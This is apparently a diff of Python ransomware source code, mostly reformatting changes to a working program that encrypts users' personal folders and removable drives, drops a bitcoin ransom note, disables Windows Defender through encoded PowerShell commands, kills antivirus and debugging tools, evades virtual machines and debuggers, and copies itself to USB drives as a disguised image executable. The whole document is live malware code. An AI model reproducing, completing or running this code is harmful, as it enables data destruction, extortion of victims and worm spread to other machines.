@@ -31,7 +31,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import winshell
-from edx42 import dx42 # type: ignore
+from edx42 import dx42  # type: ignore
 from Crypto.Cipher import AES  # hidden import
 from Crypto.PublicKey import RSA
 from win32com.client import Dispatch
@@ -42,7 +42,7 @@ from Crypto.Cipher import PKCS1_OAEP
 YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
 # Encode a URL using the ex42 function from the edx42 module
 # Example: encoded_url = ex42(b"https://your-tor-server.onion".encode())
-YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded proxy
+YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()  # Replace with your encoded proxy
 YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
 YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
 id = ""
@@ -54,7 +54,7 @@ rmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuBydKlcp
 xwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992jFJ3j
 8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxdtH80
 fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQAB
------END RSA PUBLIC KEY-----""" # Replace with your public key if needed
+-----END RSA PUBLIC KEY-----"""  # Replace with your public key if needed
 
 
 def is_admin():
@@ -67,6 +67,7 @@ def is_admin():
 def set_process_critical():
     ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
     ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
+
 
 def freeze_keyboard():
     ctypes.windll.user32.BlockInput(True)
@@ -323,11 +324,21 @@ def check_connection(url="http://www.google.com/", timeout=30):
 
 def block_processes():
     execute_command("powercfg /h off")
-    execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBUAGEAbQBwAGUAcgBQAHIAbwB0AGUAYwB0AGkAbwBuACAAJAB0AHIAdQBlAA==")
-    execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=")
-    execute_command(f"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ControlledFolderAccessAllowedApplication '{sys.executable}'\"")
-    execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQBuAGEAYgBsAGUAQwBvAG4AdAByAG8AbABsAGUAZABGAG8AbABkAGUAcgBBAGMAYwBlAHMAcwAgAEQAaQBzAGEAYgBsAGUAZAA=")
-    execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUABTAFIAZQBhAGQATABpAG4AZQBcAEMAbwBuAHMAbwBsAGUASABvAHMAdABfAGgAaQBzAHQAbwByAHkALgB0AHgAdAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==")
+    execute_command(
+        "powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBUAGEAbQBwAGUAcgBQAHIAbwB0AGUAYwB0AGkAbwBuACAAJAB0AHIAdQBlAA=="
+    )
+    execute_command(
+        "powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA="
+    )
+    execute_command(
+        f"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ControlledFolderAccessAllowedApplication '{sys.executable}'\""
+    )
+    execute_command(
+        "powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQBuAGEAYgBsAGUAQwBvAG4AdAByAG8AbABsAGUAZABGAG8AbABkAGUAcgBBAGMAYwBlAHMAcwAgAEQAaQBzAGEAYgBsAGUAZAA="
+    )
+    execute_command(
+        "powershell -ExecutionPolicy Bypass -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUABTAFIAZQBhAGQATABpAG4AZQBcAEMAbwBuAHMAbwBsAGUASABvAHMAdABfAGgAaQBzAHQAbwByAHkALgB0AHgAdAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA=="
+    )
     blocked_processes = [
         "DbgX.Shell", "Dbgview", "ILSpy", "MpCmdRun", "MsMpEng", "ProcessHacker", "SbieCtrl",
         "SbieSvc", "SecurityHealthSystray", "SentinelAgent", "SentinelHelperService", "SentinelUI", "WMIADAP", "autoruns",
@@ -343,7 +354,7 @@ def block_processes():
         "windasm", "windbg", "wmic", "x32dbg", "x64dbg",
     ]
     for proc in blocked_processes:
-        execute_command(f"taskkill /f /im \"{proc}\"")
+        execute_command(f'taskkill /f /im "{proc}" /t')
 
 
 def encrypt_key(aes_key):
@@ -380,40 +391,39 @@ def start_encryption():
                 # print(f"Error sending data: {e}")
                 continue
         with open(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb"
+            os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256"), "wb"
         ) as f:
             f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
         if not dev_mode:
             encrypt_directory(
-                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), bytes(key)
+                os.path.join(rf"C:\Users\{getpass.getuser()}", "Desktop"), bytes(key)
             )
             encrypt_directory(
-                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), bytes(key)
+                os.path.join(rf"C:\Users\{getpass.getuser()}", "Downloads"), bytes(key)
             )
             encrypt_directory(
-                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), bytes(key)
+                os.path.join(rf"C:\Users\{getpass.getuser()}", "Documents"), bytes(key)
             )
             encrypt_directory(
-                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), bytes(key)
+                os.path.join(rf"C:\Users\{getpass.getuser()}", "Pictures"), bytes(key)
             )
             encrypt_directory(
-                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), bytes(key)
+                os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"), bytes(key)
             )
             bitmask = ctypes.windll.kernel32.GetLogicalDrives()
             for disk in [
-                f"{letter}:/"
+                f"{letter}:\\"
                 for i, letter in enumerate(string.ascii_uppercase)
                 if bitmask & (1 << i)
             ]:
-                if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv(
-                    "HOMEDRIVE"
-                ) and ctypes.windll.kernel32.GetDriveTypeW(disk) == 2:
+                if (
+                    disk[:1] != os.getenv("SystemDrive")
+                    and disk[:1] != os.getenv("HOMEDRIVE")
+                    and ctypes.windll.kernel32.GetDriveTypeW(disk) == 2
+                ):
                     encrypt_directory(disk, bytes(key))
         else:
-            encrypt_directory(
-                ".\\tests", bytes(key)
-            )
-
+            encrypt_directory(r".\tests", bytes(key))
     finally:
         zeroize1(key)
         munlock(key)
@@ -499,7 +509,9 @@ To get them back, please follow the instructions below.
 - All your files will become permanently encrypted and unrecoverable if you don't pay within 3 days!!!
 
 Don't Cry, just pay =}}"""
-    file_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", r"Desktop\DCRY_README.txt")
+    file_path = os.path.join(
+        rf"C:\Users\{getpass.getuser()}", r"Desktop\DCRY_README.txt"
+    )
     with open(file_path, "w") as f:
         f.write(msg)
     startup = winshell.startup()
@@ -526,7 +538,7 @@ def execute_command(command, shell=True, wait=True):
         return subprocess.Popen(
             command, creationflags=subprocess.CREATE_NO_WINDOW, shell=shell
         ).wait()
-    else: 
+    else:
         return subprocess.Popen(
             command, creationflags=subprocess.CREATE_NO_WINDOW, shell=shell
         )
@@ -547,7 +559,9 @@ def disable_AV():
         "xp-antispy", "zegarynka", "zlclient", "winpa'rolex",
     ]
     for proc in AV_processes:
-        execute_command(f"taskkill /f /im \"{(proc + ".exe") if not proc.endswith(".dll") else proc}\"")
+        execute_command(
+            f'taskkill /f /im "{(proc + ".exe") if not proc.endswith(".dll") else proc}" /t'
+        )
 
 
 def disable_all():
@@ -557,24 +571,25 @@ def disable_all():
     disable_task_manager()
     disable_AV()
 
+
 def is_vm():
     try:
         output = subprocess.check_output(
-            ['wmic', 'computersystem', 'get', 'model'],
-            encoding='utf-8',
+            ["wmic", "computersystem", "get", "model"],
+            encoding="utf-8",
             timeout=3,
             creationflags=subprocess.CREATE_NO_WINDOW,
         )
         if any(
             vm in output
             for vm in [
-                'Virtual',
-                'VMware',
-                'VirtualBox',
-                'Hyper-V',
-                'QEMU',
-                'KVM',
-                'Parallels',
+                "Virtual",
+                "VMware",
+                "VirtualBox",
+                "Hyper-V",
+                "QEMU",
+                "KVM",
+                "Parallels",
             ]
         ):
             return True
@@ -582,26 +597,26 @@ def is_vm():
         pass
     try:
         output = subprocess.check_output(
-            ['getmac'],
-            encoding='utf-8',
+            ["getmac"],
+            encoding="utf-8",
             timeout=3,
             creationflags=subprocess.CREATE_NO_WINDOW,
         )
         if bool(
             re.search(
-                r'(00:05:69|00:0C:29|00:50:56|00:1C:14|00:03:FF|00:05:00)', output
+                r"(00:05:69|00:0C:29|00:50:56|00:1C:14|00:03:FF|00:05:00)", output
             )
         ):
             return True
     except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
         pass
     paths = [
-        'C:\\\\Program Files\\\\VMware\\\\VMware Tools',
-        'C:\\\\Program Files\\\\Oracle\\\\VirtualBox Guest Additions',
-        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxGuest.sys',
-        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxMouse.sys',
-        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxSF.sys',
-        'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsSandbox_',
+        rf"{os.getenv("SystemDrive")}\Program Files\VMware\VMware Tools",
+        rf"{os.getenv("SystemDrive")}\Program Files\Oracle\VirtualBox Guest Additions",
+        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxGuest.sys",
+        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxMouse.sys",
+        rf"{os.getenv("SystemDrive")}\Windows\System32\drivers\VBoxSF.sys",
+        rf"{os.getenv("SystemDrive")}\Program Files\WindowsApps\Microsoft.WindowsSandbox_",
     ]
     if any(os.path.exists(path) for path in paths):
         return True
@@ -616,17 +631,17 @@ def is_vm():
     except (AttributeError, OSError):
         pass
     sus_procs = {
-        'vmtoolsd',
-        'vboxservice',
-        'wireshark',
-        'fiddler',
-        'sandboxie',
-        'processhacker',
+        "vmtoolsd",
+        "vboxservice",
+        "wireshark",
+        "fiddler",
+        "sandboxie",
+        "processhacker",
     }
     with ThreadPoolExecutor() as executor:
         futures = {
-            executor.submit(lambda proc: proc.info.get('name', '').lower(), proc): proc
-            for proc in psutil.process_iter(['name'])
+            executor.submit(lambda proc: proc.info.get("name", "").lower(), proc): proc
+            for proc in psutil.process_iter(["name"])
         }
         if any(future.result() in sus_procs for future in futures):
             return True
@@ -636,84 +651,73 @@ def is_vm():
     if time.perf_counter() - start_time > 0.5:
         return True
     try:
-        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
-                             'HARDWARE\\\\DESCRIPTION\\\\System')
-        bios_info = winreg.QueryValueEx(key, 'SystemBiosVersion')[0]
-        if any(vm in bios_info for vm in ['VMWARE', 'VIRTUAL', 'QEMU', 'XEN']):
+        key = winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System"
+        )
+        bios_info = winreg.QueryValueEx(key, "SystemBiosVersion")[0]
+        if any(vm in bios_info for vm in ["VMWARE", "VIRTUAL", "QEMU", "XEN"]):
             return True
     except:
         pass
-        
+
     return False
 
 
 def is_debugger_present():
-    debugging_modules = {
-        'pdb',
-        'debugpy',
-        'pydevd',
-        'ipdb',
-        'bdb'
-    }
+    debugging_modules = {"pdb", "debugpy", "pydevd", "ipdb", "bdb"}
     if debugging_modules.intersection(sys.modules):
         return True
-    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
+    if hasattr(sys, "gettrace") and sys.gettrace() is not None:
         return True
     try:
-        if hasattr(sys, '_getframe') and sys._getframe(1).f_trace is not None:
+        if hasattr(sys, "_getframe") and sys._getframe(1).f_trace is not None:
             return True
     except (AttributeError, ValueError):
-        pass    
+        pass
     try:
         if ctypes.windll.kernel32.IsDebuggerPresent():
             return True
     except (ImportError, AttributeError):
-        pass         
+        pass
     return False
+
 
 def infect_usb():
     worm_path = os.path.abspath(sys.executable)
     exe_name = "IMG_4599.jpg.exe"
     lnk_name = "IMG_4599.jpg.lnk"
-
     for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
-        usb_root = f"{letter}:/"
+        usb_root = f"{letter}:\\"
         try:
-            if os.path.exists(usb_root) and ctypes.windll.kernel32.GetDriveTypeW(f"{usb_root}") == 2:
+            if (
+                os.path.exists(usb_root)
+                and ctypes.windll.kernel32.GetDriveTypeW(f"{usb_root}") == 2
+            ):
                 exe_full = os.path.join(usb_root, exe_name)
                 lnk_full = os.path.join(usb_root, lnk_name)
 
                 shutil.copy2(worm_path, exe_full)
 
                 os.system(f'attrib +h +s "{exe_full}"')
-
-                vbs_code = f'''
-Set oWS = CreateObject("WScript.Shell")
-Set oLink = oWS.CreateShortcut("{lnk_full}")
-oLink.TargetPath = "{exe_full}"
-oLink.WorkingDirectory = "{os.path.dirname(exe_full)}"
-oLink.IconLocation = "imageres.dll,66"
-oLink.Save
-'''
-                with open("~tmp.vbs", "w", encoding="utf-8") as f:
-                    f.write(vbs_code)
-                os.system('wscript ~tmp.vbs')
-                os.remove("~tmp.vbs")
+            shortcut_path = lnk_full
+            shell = Dispatch("WScript.Shell")
+            shortcut = shell.CreateShortCut(shortcut_path)
+            shortcut.TargetPath = exe_full
+            shortcut.save()
         except Exception as e:
             # print(f"Error while infect {usb_root}: {e}")
             pass
 
 
-
 dev_mode = True
 if __name__ == "__main__":
     if not check_connection():
-            sys.exit(2)
+        sys.exit(2)
     if not is_admin():
-            ctypes.windll.shell32.ShellExecuteW(
-                None, "runas", sys.executable, " ".join(sys.argv), None, 1
-            )
-            sys.exit(0)
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, " ".join(sys.argv), None, 1
+        )
+        sys.exit(0)
     if not (is_vm() and is_debugger_present()):
         sys.exit(3)
     if not dev_mode:
